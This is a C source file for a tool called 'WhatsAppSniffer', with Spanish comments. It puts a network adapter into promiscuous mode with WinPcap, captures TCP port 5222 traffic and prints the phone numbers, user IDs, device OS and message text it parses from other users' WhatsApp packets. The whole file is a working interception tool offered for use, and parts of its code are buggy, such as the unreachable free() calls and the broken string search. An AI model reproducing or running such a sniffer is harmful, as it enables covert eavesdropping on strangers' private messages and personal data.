#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock.h>
#include <ws2tcpip.h>
#pragma option push -pc
#define HAVE_REMOTE
#include "pcap.h"
#pragma option pop

typedef struct eth_header
{
	unsigned char eth_dst[6];
	unsigned char eth_src[6];
	unsigned short eth_type;
}eth_header;

/* 4 bytes IP address */
typedef struct ip_address{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
}ip_address;

/* IPv4 header */
typedef struct ip_header{
    u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
    u_char  tos;            // Type of service 
    u_short tlen;           // Total length 
    u_short identification; // Identification
    u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
    u_char  ttl;            // Time to live
    u_char  proto;          // Protocol
    u_short crc;            // Header checksum
    ip_address  saddr;      // Source address
    ip_address  daddr;      // Destination address
    u_int   op_pad;         // Option + Padding
}ip_header;

typedef struct tcp_header
{
    u_short tcp_sport;
	u_short tcp_dport;
    u_long tcp_seqnum;
    u_long tcp_acknum;
    u_char tcp_hlen; // hlen 4 bits + reserved 4 bits
    u_char tcp_flags; // reserved 2 bits + control 6 bits
    u_short tcp_win;
    u_short tcp_cksum;
    u_short tcp_urgptr;
}tcp_header;


int usage();
int GetInformation(char * data, int len);
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
char * iReadLastBytes(char * iPacket, int iPacketLen,int iReadBytes);
char * iReadFirstBytes(char * i_Packet, int i_Len, int iBytestoRead);
int InStrPos(char * x_Packet,int x_PacketLen, char * i_Find);
char * iFilterExpression(char * iPacketData, int iPacket_Len, int iMode);

int main(int argc, char **argv)
{  
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * descr;
    const u_char * packet;
    struct pcap_pkthdr hdr;
    struct ether_header *eptr;
    char *ptr;
    pcap_if_t *alldevs;
    
    int InterfaceNumber = usage();
    
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
		return;

	pcap_if_t *d;
	/* Jump to the selected adapter */
	int i;
    for(d = alldevs, i = 0; i < InterfaceNumber-1 ;d = d->next, i++);
	
	pcap_t *adhandle = pcap_open_live(d->name,    // name of the device
								65536,          // portion of the packet to capture
												// 65536 guarantees that the whole packet will be captured on all the link layers
								1,				// promiscuous mode (nonzero means promiscuous)
								1000,           // read timeout
								errbuf);        // error buffer
	if ( adhandle == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return;
    }
    

    struct bpf_program fcode;
    
    //Filtramos :p
    char packet_filter[255] = "tcp port 5222";
    
   // pcap_compile(descr, &fcode, packet_filter, 1, 0);
    //pcap_set_filter(descr, &fcode);
   if (pcap_compile(adhandle, &fcode, packet_filter, 1, 0) < 0)
    {
        fprintf(stderr,"\nUnable to compile the packet filter. Check the syntax.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }
    
    if (pcap_setfilter(adhandle, &fcode) < 0)
    {
        fprintf(stderr,"\nError setting the filter.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }
    
    pcap_freealldevs(alldevs);
    
    pcap_loop(adhandle, 0, packet_handler, NULL);
    printf("\nEsperando paquetes de WhatsApp en el puerto 5222...");
    return 0;
}
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{    
    
    
	//We're receiving only tcp packets over ethernet
	ip_header *ih = (ip_header *) (pkt_data + sizeof(eth_header)); //length of ethernet header
	/* retireve the position of the tcp header */
    u_int ip_len = (ih->ver_ihl & 0xf) * 4;
	tcp_header *th = (tcp_header *) ((u_char*)ih + ip_len);
	u_int tcp_len = (th->tcp_hlen >> 4) * 4;	//The size of the TCP header in 32-bit words (4 bytes)
	u_char *data = (u_char *)th + tcp_len;
	u_int data_len = ntohs(ih->tlen) - ip_len - tcp_len;
	GetInformation((char *)data, data_len);
}

int GetInformation(char * data, int len)
{
    if(len < 5)
    {
        return 0;
    }

    char * data_filtrada = iFilterExpression(data,len,3);
    char * statusprefix = iReadFirstBytes(data_filtrada,lstrlen(data_filtrada),2);
    
    if(InStrPos(statusprefix,lstrlen(statusprefix),"WA") != 1)
    {

        char * mobileos = iReadLastBytes(data_filtrada,lstrlen(data_filtrada),strlen(data_filtrada) - 2);
        printf("Mobile-OS:%s\n",mobileos);
        return 0;
    }
    
    if(InStrPos(statusprefix,lstrlen(statusprefix),"ta") != 1)
    {
        
        char * notifname = iReadLastBytes(data_filtrada,lstrlen(data_filtrada),strlen(data_filtrada) - 2);
        printf("NotificationsName:%s\n",notifname);
        return 0;
    }


    if(strchr(iReadFirstBytes(data_filtrada,lstrlen(data_filtrada),2), 'C') != NULL)
    {
        //Primeros 25 caracteres son identificador + numero
        //Resto = mensaje
        char * phoneanduserid = iReadFirstBytes(data_filtrada,lstrlen(data_filtrada),25);
        char * phonenumber    = iReadLastBytes(phoneanduserid,lstrlen(phoneanduserid),9);
        char * whatsappuserid = iReadFirstBytes(data_filtrada,lstrlen(data_filtrada),25 - 9);
        
        printf("Numero:%s\n",phonenumber);
        printf("WhatsUserid:%s\n",whatsappuserid);
        printf("Message:%s\n",iReadLastBytes(data_filtrada,lstrlen(data_filtrada),lstrlen(data_filtrada)-25));
        return 0;     
    }
    else //FALTA POR VER UNA COMPROBACION CUANDO LLEGA MENSAJE
    { //Recibimos mensaje
       char * phonenumbertmp = iFilterExpression(data,len,1);
       char * phonenumberrecieved = iReadFirstBytes(phonenumbertmp,lstrlen(phonenumbertmp),13);
       
       char * msgreceived = iFilterExpression(data,len,2);
       
       printf("Numero:%s\n",phonenumberrecieved);
       printf("Message:%s\n",msgreceived);  
    }
    
}


int usage()
{
    printf("WhatsAppSniffer 0.1 BETA\nDesarrollado por p0is0n-123\n");
    printf("Agradecimientos: Yago Jesus, Thor\n");
    pcap_if_t *alldevices;
    pcap_if_t *d;
    char errbuf2[PCAP_ERRBUF_SIZE];
    int i = 0;
    int interNumber = 0;
    
    pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevices, errbuf2);
    
    for(d=alldevices;d!=NULL;d = d->next)
    {
        printf("%d. %s", ++i, d->name);
        if(d->description)
        {
            printf("\n(%s)\n",d->description);
        }
    }
    
    
    printf("\nIntrocude el numero correspondiente a tu tarjeta->");
    scanf("%d",&interNumber);
    return interNumber;
}
char * iReadLastBytes(char * iPacket, int iPacketLen,int iReadBytes)
{
    int x = 0;
    int y = 0;
    char * iNewStr = (char*)malloc(iReadBytes+1);
    ZeroMemory(iNewStr,iReadBytes+1);
    
    for(x=iPacketLen-1,y=0;x!=iPacketLen-iReadBytes-1;x--,y++)
    {
        if(x == 0)
        {
            break;
        }
        iNewStr[y] = iPacket[x];
    }
    
    return strrev(iNewStr);
    free(iNewStr);
}

char * iReadFirstBytes(char * i_Packet, int i_Len, int iBytestoRead)
{
     int z = 0;
     char * i_DestStr = (char*)malloc(iBytestoRead+1);
     ZeroMemory(i_DestStr, iBytestoRead+1);
     
     for(z=0;z<iBytestoRead;z++)
     {
        i_DestStr[z] = i_Packet[z];
     }
     
     return i_DestStr;
     free(i_DestStr);
}

int InStrPos(char * x_Packet,int x_PacketLen, char * i_Find)
{
    int t = 0, iPos = 0;
    int contador = 0;
    
    for(t=0;t<x_PacketLen;t++)
    {
        for(contador=0;contador<lstrlen(i_Find);contador++)
        {
            if(x_Packet[t] == i_Find[contador])
            {
                t++;
            }
        }
        return t;
    }

}


char * iFilterExpression(char * iPacketData, int iPacket_Len, int iMode)
{
    //Function to remove characters of a WhattsAppPacket
    
    //iMode => 1 (Numeric Only)
    //iMode => 2 (LettersOnly)
    //iMode => 3 (Mixed)
    
    char * iNewStringFilter = (char*)malloc(iPacket_Len);
    int u = 0, counter = 0;
    ZeroMemory(iNewStringFilter,iPacket_Len);
    
    for(u=0;u<iPacket_Len;u++)
    {
        if(iMode == 1)
        {//Numeros
            if((int)iPacketData[u] >= 48 && (int)iPacketData[u] <= 57)
            {
                 iNewStringFilter[counter] = iPacketData[u];
                 counter++;
            }
            else
            {
                continue;
            }
        }
        else if(iMode == 2)
        {//Letras
            if((int)iPacketData[u] >= 65 && (int)iPacketData[u] <= 90 || (int)iPacketData[u] >= 97 && (int)iPacketData[u] <= 122 || (int)iPacketData[u] == 32 )
            {
               iNewStringFilter[counter] = iPacketData[u];
               counter++;
            }
            else
            {
               continue;      
            }
        }
        else if(iMode == 3)
        {//Mixed
        
            if((int)iPacketData[u] >= 48 && (int)iPacketData[u] <= 57 ||(int)iPacketData[u] >= 65 && (int)iPacketData[u] <= 90 || (int)iPacketData[u] >= 97 && (int)iPacketData[u] <= 122 || (int)iPacketData[u] == 32)
             {
                iNewStringFilter[counter] = iPacketData[u];
                counter++;
             }
            else
             {
                continue;      
             }
        }   
        
    }
    
   return iNewStringFilter;
}
